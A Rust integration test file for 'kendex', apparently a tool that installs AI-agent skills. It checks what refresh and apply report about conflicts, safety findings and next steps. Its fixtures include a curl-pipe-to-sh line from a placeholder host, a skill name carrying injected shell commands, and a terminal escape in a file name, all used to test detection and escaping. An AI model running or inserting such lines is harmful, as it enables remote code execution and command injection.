//! What a refresh says when it ends. The run this pins is the one a
//! consumer hit: a skill already on disk from a pre-rename install, blocked
//! for every tool it is declared on, beside one that installs and carries a
//! safety finding. The output alone has to answer what changed, what did
//! not, why, and what to type next.
#![cfg(unix)]

use std::collections::BTreeSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

#[allow(clippy::expect_used)]
fn kendex(home: &Path, cwd: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_kendex"))
        .args(args)
        .current_dir(cwd)
        .env_clear()
        .env("HOME", home)
        .env("KENDEX_REAL_HOME", "1")
        .env("KENDEX_BACKGROUND_REFRESH", "off")
        .env("PATH", std::env::var("PATH").unwrap_or_default())
        .output()
        .expect("kendex binary runs")
}

fn said(output: &Output) -> String {
    String::from_utf8_lossy(&output.stderr).into_owned()
}

/// The ledger line, whichever of its shapes this run printed.
#[allow(clippy::expect_used)]
fn ledger(printed: &str) -> String {
    printed
        .lines()
        .find(|line| line.contains(": refreshed ") || line.contains(": up to date"))
        .unwrap_or_else(|| panic!("the run ends on a ledger: {printed}"))
        .to_owned()
}

/// A skill body the safety rules have something to say about.
const RISKY: &str = "Set it up with curl https://x.example/i.sh | sh\n";

#[allow(clippy::unwrap_used)]
fn skill(catalog: &Path, name: &str, body: &str) {
    fs::create_dir_all(catalog.join(format!("skills/{name}"))).unwrap();
    fs::write(
        catalog.join(format!("skills/{name}/SKILL.md")),
        format!("---\nname: {name}\ndescription: does {name}\n---\n{body}"),
    )
    .unwrap();
}

#[allow(clippy::unwrap_used)]
fn manifest(project: &Path, catalog: &Path, tools: &str, method: &str, declarations: &str) {
    fs::create_dir_all(project.join(".claude")).unwrap();
    fs::write(
        project.join("kendex.toml"),
        format!(
            "schema = 6\n\n[sources.cat]\npath = \"{}\"\n\n[install]\nharnesses = {tools}\nmethod = \"{method}\"\n\n{declarations}",
            catalog.display()
        ),
    )
    .unwrap();
}

/// The frontmatter v1 actually wrote: the stamp nests under `metadata:`,
/// never at column 0. A fixture spelling it flat would prove the test, not
/// the code.
const V1_SKILL: &str = "---\nname: growth-guards\ndescription: keep it small\nlicense: MIT\nmetadata:\n  author: vanillagreen\n  source: vstack\n  repository: \"https://github.com/vanillagreencom/vstack\"\n---\nThe copy v1 wrote.\n";

/// Every item a safety block reports a finding against.
fn flagged_items(listed: &str) -> BTreeSet<String> {
    let mut found = BTreeSet::new();
    let mut item = None;
    for line in listed.lines() {
        match line.strip_prefix("safety: skill ") {
            Some(rest) => item = rest.split(" for ").next().map(str::to_owned),
            None => {
                if line.trim_start().starts_with('[')
                    && let Some(name) = &item
                {
                    found.insert(name.clone());
                }
            }
        }
    }
    found
}

/// A project declaring two skills on two tools. `growth-guards` already
/// sits at both places, written by v1 and out of date by one file;
/// `tidy` is free to install and has a finding of its own.
#[allow(clippy::unwrap_used)]
fn pre_rename_project(home: &Path) -> PathBuf {
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "growth-guards", RISKY);
    fs::create_dir_all(catalog.join("skills/growth-guards/references")).unwrap();
    fs::write(
        catalog.join("skills/growth-guards/references/rules.md"),
        "the rules\n",
    )
    .unwrap();
    skill(&catalog, "tidy", RISKY);
    manifest(
        &project,
        &catalog,
        "[\"claude\", \"codex\"]",
        "copy",
        "[skills.growth-guards]\nsource = \"cat\"\n\n[skills.tidy]\nsource = \"cat\"\n",
    );
    for tool in [".claude", ".agents"] {
        let at = project.join(tool).join("skills/growth-guards/references");
        fs::create_dir_all(&at).unwrap();
        fs::write(at.parent().unwrap().join("SKILL.md"), V1_SKILL).unwrap();
        fs::write(at.join("rules.md"), "the older rules\n").unwrap();
    }
    project
}

/// The whole contract in one run: one conflict line for one item however
/// many tools hit it, every position it sits at, what the files in the way
/// are against the catalog, where they came from, and a closing ledger
/// whose every nonzero part carries its next step.
#[test]
#[allow(clippy::unwrap_used)]
fn a_blocked_refresh_ends_on_a_ledger_naming_every_outcome_and_its_next_step() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = pre_rename_project(home);

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));

    // One item, one line — not one line per tool, and no position hidden.
    assert_eq!(
        printed.matches("conflict:").count(),
        1,
        "the same conflict was printed once per tool: {printed}"
    );
    assert!(
        printed.contains("conflict: skill growth-guards for Claude Code, Codex:"),
        "the one line names every tool the conflict blocks: {printed}"
    );
    assert!(
        printed.contains(&format!(
            "  also at {}",
            project.join(".agents/skills/growth-guards").display()
        )),
        "every position is named, so the reader can act on each: {printed}"
    );
    assert!(
        printed.contains("differs from the catalog in 2 files: SKILL.md, references/rules.md"),
        "the conflict says how the files in the way compare: {printed}"
    );
    assert!(
        printed.contains("(it carries a source: vstack stamp)"),
        "what the files in the way claim about themselves is named: {printed}"
    );

    // The ledger: every outcome of the run, and the next step for each.
    assert_eq!(
        ledger(&printed),
        format!(
            "{}: refreshed 3 changes · skipped 1 item on conflict · flagged 2 items on safety",
            project.display()
        ),
        "{printed}"
    );
    assert!(
        printed.contains("  skipped — kendex apply --replace-unmanaged, or the kendex adopt line under each conflict above"),
        "the skipped part carries its next step: {printed}"
    );
    assert!(
        printed.contains("  flagged — the safety lines above"),
        "the flagged part carries its next step: {printed}"
    );

    // The two sentences that hid these outcomes before.
    assert!(
        !printed.contains("nothing installed") && !printed.contains("up to date"),
        "a run with a blocked install is neither empty nor up to date: {printed}"
    );

    // The count and the lines it sends the reader to are one reading: the
    // ledger counts exactly the items the block above carries a finding
    // against, so following the pointer finds what the number promised.
    assert_eq!(
        flagged_items(&printed),
        BTreeSet::from(["growth-guards".to_owned(), "tidy".to_owned()]),
        "the ledger's count and the block it points at disagree: {printed}"
    );
}

/// A run with nothing to report beyond its writes says only that. The
/// ledger's parts are outcomes, not a fixed shape padded with zeroes.
#[test]
#[allow(clippy::unwrap_used)]
fn a_clean_refresh_ends_on_the_count_alone() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "tidy", "Nothing alarming here.\n");
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.tidy]\nsource = \"cat\"\n",
    );

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));
    assert_eq!(
        ledger(&printed),
        format!("{}: refreshed 2 changes", project.display()),
        "a clean run reports its writes and carries no outcome it does not have: {printed}"
    );
}

/// Advisory findings are not a reason to stop calling a current scope
/// current: they print above, and they recur on every run.
#[test]
#[allow(clippy::unwrap_used)]
fn a_current_scope_with_findings_still_reads_up_to_date() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "tidy", RISKY);
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.tidy]\nsource = \"cat\"\n",
    );
    assert!(
        kendex(home, &project, &["refresh", "-y", "--scope", "project"])
            .status
            .success()
    );

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));
    assert_eq!(
        ledger(&printed),
        format!(
            "{}: up to date · flagged 1 item on safety",
            project.display()
        ),
        "{printed}"
    );
    assert!(
        printed.contains("  flagged — the safety lines above"),
        "{printed}"
    );
}

/// Nothing to write is not a write of nothing. A completion line under
/// "nothing to do" reads as a run that finished something.
#[test]
#[allow(clippy::unwrap_used)]
fn an_up_to_date_apply_claims_no_changes() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "tidy", "Nothing alarming here.\n");
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.tidy]\nsource = \"cat\"\n",
    );
    assert!(
        kendex(home, &project, &["apply", "-y", "--scope", "project"])
            .status
            .success()
    );

    let printed = said(&kendex(
        home,
        &project,
        &["apply", "-y", "--scope", "project"],
    ));
    assert!(printed.contains("nothing to do"), "{printed}");
    assert!(
        !printed.contains("applied"),
        "an apply with nothing to write announced a completion: {printed}"
    );
}

/// The comparison is what makes the choice trivial or not: files in the way
/// that are byte-for-byte the catalog's cost the reader nothing to keep.
#[test]
#[allow(clippy::unwrap_used)]
fn files_identical_to_the_catalog_say_adopting_them_is_safe() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "gamma", "Body.\n");
    let body = fs::read_to_string(catalog.join("skills/gamma/SKILL.md")).unwrap();
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "symlink",
        "[skills.gamma]\nsource = \"cat\"\n",
    );
    fs::create_dir_all(project.join(".claude/skills/gamma")).unwrap();
    fs::write(project.join(".claude/skills/gamma/SKILL.md"), &body).unwrap();

    let printed = said(&kendex(
        home,
        &project,
        &["apply", "--plan", "--scope", "project"],
    ));
    assert!(
        printed.contains("identical to the catalog — adopt is safe"),
        "content that matches the catalog says so, beside the adopt offer: {printed}"
    );
    assert!(
        !printed.contains("differs from the catalog"),
        "identical content must never read as differing: {printed}"
    );
}

/// The same content, where adoption cannot act. Nothing may promise an
/// adopt line that was never printed — not the comparison above the row,
/// not the ledger below it.
#[test]
#[allow(clippy::unwrap_used)]
fn a_conflict_with_no_adopt_offer_promises_none() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    // A name a shell would read as more than one argument is never printed
    // as one, so this item's only exit is the reader moving the files.
    let name = "ship it; echo hi & true";
    skill(&catalog, name, "Body.\n");
    let body = fs::read_to_string(catalog.join(format!("skills/{name}/SKILL.md"))).unwrap();
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "symlink",
        &format!("[skills.\"{name}\"]\nsource = \"cat\"\n"),
    );
    let at = project.join(format!(".claude/skills/{name}"));
    fs::create_dir_all(&at).unwrap();
    fs::write(at.join("SKILL.md"), &body).unwrap();

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));
    assert!(
        printed.contains("to keep those files: move them somewhere else first"),
        "the fixture needs an item adoption cannot name: {printed}"
    );
    assert!(
        printed.contains("identical to the catalog"),
        "the comparison still states what the content is: {printed}"
    );
    assert!(
        !printed.contains("adopt is safe"),
        "the comparison called adoption safe where no adopt was offered: {printed}"
    );
    assert!(
        !printed.contains("the kendex adopt line under each conflict above"),
        "the ledger pointed at an adopt line nobody printed: {printed}"
    );
}

/// The ledger names a shared command only where it settles every skipped
/// item. Three fixtures, three shapes of skipped set, one rule.
#[test]
#[allow(clippy::unwrap_used)]
fn a_shared_command_is_named_only_where_it_settles_every_skipped_item() {
    // Adopt-only: a folder shared by hand, which the take-over must never
    // write over, so no scope-wide command covers it.
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "deploy", "Upstream.\n");
    manifest(
        &project,
        &catalog,
        "[\"claude\", \"codex\"]",
        "symlink",
        "[skills.deploy]\nsource = \"cat\"\n",
    );
    let folder = project.join(".claude/skills/deploy");
    fs::create_dir_all(&folder).unwrap();
    fs::write(folder.join("SKILL.md"), "Shared by hand.\n").unwrap();
    fs::create_dir_all(project.join(".agents/skills")).unwrap();
    std::os::unix::fs::symlink(&folder, project.join(".agents/skills/deploy")).unwrap();

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));
    assert!(
        printed.contains("to keep those files: kendex adopt skill deploy"),
        "the fixture needs an adopt-only conflict: {printed}"
    );
    assert!(
        printed.contains("  skipped — see each conflict line above"),
        "no scope-wide command settles a shared folder: {printed}"
    );

    // Mixed: one replaceable conflict beside an install the reader edited.
    // The take-over settles the first and never touches the second.
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "tidy", "Upstream.\n");
    skill(&catalog, "wide", "Upstream.\n");
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.tidy]\nsource = \"cat\"\n",
    );
    assert!(
        kendex(home, &project, &["refresh", "-y", "--scope", "project"])
            .status
            .success()
    );
    // One install the reader edited, and one declared afterwards whose
    // position already holds somebody's files.
    fs::write(
        project.join(".claude/skills/tidy/SKILL.md"),
        "Edited by hand.\n",
    )
    .unwrap();
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.tidy]\nsource = \"cat\"\n\n[skills.wide]\nsource = \"cat\"\n",
    );
    let at = project.join(".claude/skills/wide");
    fs::create_dir_all(&at).unwrap();
    fs::write(at.join("SKILL.md"), "By hand.\n").unwrap();

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));
    assert!(
        printed.contains("edited on disk") && printed.contains("kendex apply --replace-unmanaged"),
        "the fixture needs one replaceable conflict and one edit: {printed}"
    );
    assert_eq!(
        ledger(&printed).split(" · ").nth(1),
        Some("skipped 2 items on conflict"),
        "{printed}"
    );
    assert!(
        printed.contains("  skipped — see each conflict line above"),
        "a flag settling one of two items was named for both: {printed}"
    );
    // The edited install is kendex's own copy; nothing tells the reader to
    // move files, and its own line two rows up carries the real choice.
    assert!(
        !printed.contains("move the files"),
        "an edited install was answered with a files-to-move sentence: {printed}"
    );
}

/// The take-over settles both of these, so the ledger names it — but only
/// one of them can be adopted by name, so the adopt half of the sentence
/// is withheld. Every-item, not any-item, on both halves.
#[test]
#[allow(clippy::unwrap_used)]
fn a_take_over_that_settles_every_item_still_withholds_the_adopt_half() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    // A name a shell would read as more than one argument is never printed
    // as one, so this item has no adopt command while the other does.
    let awkward = "ship it; echo hi & true";
    skill(&catalog, "tidy", "Upstream.\n");
    skill(&catalog, awkward, "Upstream.\n");
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        &format!("[skills.tidy]\nsource = \"cat\"\n\n[skills.\"{awkward}\"]\nsource = \"cat\"\n"),
    );
    for name in ["tidy", awkward] {
        let at = project.join(format!(".claude/skills/{name}"));
        fs::create_dir_all(&at).unwrap();
        fs::write(at.join("SKILL.md"), "By hand.\n").unwrap();
    }

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));
    assert!(
        printed.contains("to keep those files: kendex adopt skill tidy"),
        "the plainly named item still prints its own adopt line: {printed}"
    );
    assert!(
        printed.contains("to keep those files: move them somewhere else first"),
        "the fixture needs one item adoption cannot name: {printed}"
    );
    assert!(
        printed.contains("  skipped — kendex apply --replace-unmanaged\n")
            || printed.ends_with("  skipped — kendex apply --replace-unmanaged\n"),
        "the take-over settles both, so it is named: {printed}"
    );
    assert!(
        !printed.contains("or the kendex adopt line under each conflict above"),
        "one item of two has no adopt line, so the clause is a claim too far: {printed}"
    );
}

/// A differing name comes off a tree kendex did not write, and reaches a
/// terminal as its own characters rather than as an escape it would act on.
#[test]
#[allow(clippy::unwrap_used)]
fn a_differing_name_reaches_the_terminal_escaped() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "wide", "Body.\n");
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.wide]\nsource = \"cat\"\n",
    );
    let at = project.join(".claude/skills/wide");
    fs::create_dir_all(&at).unwrap();
    fs::write(at.join("SKILL.md"), "By hand.\n").unwrap();
    fs::write(at.join("we\u{1b}[31mird.md"), "mine\n").unwrap();

    let printed = said(&kendex(
        home,
        &project,
        &["apply", "--plan", "--scope", "project"],
    ));
    assert!(
        printed.contains("we\\u{1b}[31mird.md"),
        "the name was printed as the escape sequence itself: {printed}"
    );
    assert!(
        !printed.contains("we\u{1b}[31mird.md"),
        "a control character reached the terminal: {printed}"
    );
}

/// The count and the surface it names are one reading. Whatever the
/// safety block above carries a finding against is what the number counts,
/// blocked items and written ones alike.
#[test]
#[allow(clippy::unwrap_used)]
fn the_flagged_count_matches_the_safety_block_above_it() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "guard", RISKY);
    skill(&catalog, "tidy", RISKY);
    skill(&catalog, "calm", "Nothing alarming here.\n");
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.guard]\nsource = \"cat\"\n\n[skills.tidy]\nsource = \"cat\"\n\n[skills.calm]\nsource = \"cat\"\n",
    );
    // One of the two flagged items is blocked; it is still scored, and the
    // count follows the block rather than the writes.
    let at = project.join(".claude/skills/guard");
    fs::create_dir_all(&at).unwrap();
    fs::write(at.join("SKILL.md"), "By hand.\n").unwrap();

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "--scope", "project"],
    ));
    let block = flagged_items(&printed);
    assert_eq!(
        block,
        BTreeSet::from(["guard".to_owned(), "tidy".to_owned()]),
        "the fixture needs one blocked and one written flagged item: {printed}"
    );
    assert!(
        ledger(&printed).contains(&format!("flagged {} items on safety", block.len())),
        "the number and the block it points at disagree: {printed}"
    );
}

/// A one-file item is compared like any other. The plan holds its bytes at
/// the moment it refuses, so the row says whether they match.
#[test]
#[allow(clippy::unwrap_used)]
fn a_single_file_item_says_how_it_compares() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    fs::create_dir_all(catalog.join("agents")).unwrap();
    let body = "---\nname: rust\ndescription: writes rust\n---\nUpstream.\n";
    fs::write(catalog.join("agents/rust.md"), body).unwrap();
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[agents.rust]\nsource = \"cat\"\n",
    );
    let at = project.join(".claude/agents");
    fs::create_dir_all(&at).unwrap();
    fs::write(at.join("rust.md"), "By hand.\n").unwrap();

    let printed = said(&kendex(
        home,
        &project,
        &["apply", "--plan", "--scope", "project"],
    ));
    assert!(
        printed.contains("differs from the catalog in 1 file: rust.md"),
        "a one-file item says which file differs: {printed}"
    );
}

/// Asking for more detail must not cost the reader the way out, and the
/// closing line reads the same either way.
#[test]
#[allow(clippy::unwrap_used)]
fn a_verbose_refresh_keeps_the_exits_and_the_ledger() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = pre_rename_project(home);

    let printed = said(&kendex(
        home,
        &project,
        &["refresh", "-y", "-v", "--scope", "project"],
    ));
    assert!(
        printed.contains("to keep those files: kendex adopt skill growth-guards"),
        "the verbose listing dropped the way out: {printed}"
    );
    assert!(
        printed.contains("  skipped — kendex apply --replace-unmanaged"),
        "the verbose run closed on a different ledger: {printed}"
    );
}

/// Beyond the first three, differing files are counted rather than listed,
/// and the count is of all of them.
#[test]
#[allow(clippy::unwrap_used)]
fn more_differing_files_than_are_named_are_counted() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    skill(&catalog, "wide", "Body.\n");
    // Past the bound the row itself carries, so the printed count has to
    // come from the total rather than from the names that survived it.
    for n in 0..40 {
        fs::write(
            catalog.join(format!("skills/wide/ref{n:02}.md")),
            format!("catalog {n}\n"),
        )
        .unwrap();
    }
    manifest(
        &project,
        &catalog,
        "[\"claude\"]",
        "copy",
        "[skills.wide]\nsource = \"cat\"\n",
    );
    let at = project.join(".claude/skills/wide");
    fs::create_dir_all(&at).unwrap();
    fs::write(at.join("SKILL.md"), "By hand.\n").unwrap();
    for n in 0..40 {
        fs::write(at.join(format!("ref{n:02}.md")), format!("mine {n}\n")).unwrap();
    }

    let printed = said(&kendex(
        home,
        &project,
        &["apply", "--plan", "--scope", "project"],
    ));
    assert!(
        printed.contains(
            "differs from the catalog in 41 files: SKILL.md, ref00.md, ref01.md, and 38 more"
        ),
        "the first three are named and every other one counted: {printed}"
    );
}

/// A hook that skips a tool is a decision the reader can make, so the note
/// names the file that actually decides it.
#[test]
#[allow(clippy::unwrap_used)]
fn a_hook_that_skips_a_tool_names_the_file_that_decides_it() {
    let tmp = tempfile::tempdir().unwrap();
    let home = tmp.path();
    let project = home.join("dev/app");
    let catalog = home.join("catalog");
    fs::create_dir_all(catalog.join("hooks")).unwrap();
    // Executable kinds install only from a catalog declaring kendex's layout.
    fs::write(catalog.join("kendex.toml"), "is_source_catalog = true\n").unwrap();
    fs::write(
        catalog.join("hooks/block-unsafe-rm.sh"),
        "#!/usr/bin/env bash\n# ---\n# name: block-unsafe-rm\n# event: PreToolUse\n# matcher: Bash\n# description: stop a dangerous remove\n# harnesses: [claude-code]\n# ---\nexit 0\n",
    )
    .unwrap();
    fs::create_dir_all(project.join(".pi")).unwrap();
    manifest(
        &project,
        &catalog,
        "[\"claude\", \"pi\"]",
        "copy",
        "[hooks.block-unsafe-rm]\nsource = \"cat\"\n",
    );

    let printed = said(&kendex(
        home,
        &project,
        &["apply", "--plan", "--scope", "project"],
    ));
    assert!(
        printed.contains(
            "hook block-unsafe-rm: skips pi — pi is not in the hook's own harnesses line in the catalog; add it there, or list this hook's harnesses in kendex.toml without pi"
        ),
        "the note names what decides the skip and both answers to it: {printed}"
    );
}
